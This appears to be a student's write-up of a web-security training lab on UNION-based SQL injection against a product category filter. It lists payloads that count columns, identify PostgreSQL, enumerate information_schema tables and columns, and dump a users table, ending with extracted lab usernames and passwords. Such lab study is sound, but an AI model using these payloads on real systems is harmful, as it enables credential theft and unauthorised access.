---
title: 'Lab 9: SQL injection attack, listing the database ...'
updated: 2022-12-01T14:43:50.0000000+04:00
created: 2022-12-01T13:55:44.0000000+04:00
---

Lab 9: SQL injection attack, listing the database contents on non-Oracle databases
Thursday, December 1, 2022
1:55 PM

1.  The Following Query Is used to display all tables in the database:

| Query: | SELECT \* FROM information_schema.tables |
|--------|------------------------------------------|

2.  Displaying all columns in a table:

| Query | SELECT \* FROM information_schema.columns WHERE table_name= 'Users' |
|-------|---------------------------------------------------------------------|

**<u>(Lab-09)</u>** - **<u>SQL injection attack, listing the database contents on non-Oracle databases</u>**

**SQL Injection Vulnerability** - Product Category Filter

**End Goal**

1.  Determine table that contains usernames and passwords
2.  Determine the relevant columns
3.  Output the content of the table
4.  Login as the administrator user

**<u>Analysis:</u>**

1.  Determine the number of columns

| Query to use | ' UNION SELECT NULL, NULL-- |
|--------------|-----------------------------|

![image1](image1-191.png)

- Confirms that we have two rows.

2.  Determine which rows can hold text data

| Query to use | ' UNION SELECT 'a','a'-- |
|--------------|--------------------------|

![image2](image2-87.png)

- Confirms that both rows can hold text data,

3.  Determine Database Version

| Query to use | ' UNION SELECT version(),NULL-- |
|--------------|---------------------------------|

![image3](image3-56.png)

- Confirm its using the PostgreSQL, located in the response

![image4](image4-38.png)

4.  Determine tables in the Database

| Query to use for PostgreSQL | ' UNION SELECT table_name, NULL FROM information_schema.tables-- |
|-----------------------------|------------------------------------------------------------------|

![image5](image5-25.png)

- In the response you can search for **Users** table

![image6](image6-17.png)

5.  Output Column names of the discovered Users table.

| Query to use | SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_iqtahp'-- |
|--------------|---------------------------------------------------------------------------------------------|

![image7](image7-13.png)
**Table Name: users_iqtahp**

- Look through the responses and find the column names,
- In this case we can see the following column name: username_tnneey, password_lijytu

![image8](image8-11.png)

6.  Displaying the Information from the Table using the discovered table name and Column names

| Query to use | ' UNION SELECT username_tnneey, password_lijytu from users_iqtahp-- |
|--------------|---------------------------------------------------------------------|

![image9](image9-7.png)
![image10](image10-4.png)

- Now just look for the usernames and passwords

![image11](image11-3.png)
Usernames; wiener, administrator
Password: nhii3dhkw0uc4kwdtwbk, p8pphtvi9zpy177yk33y
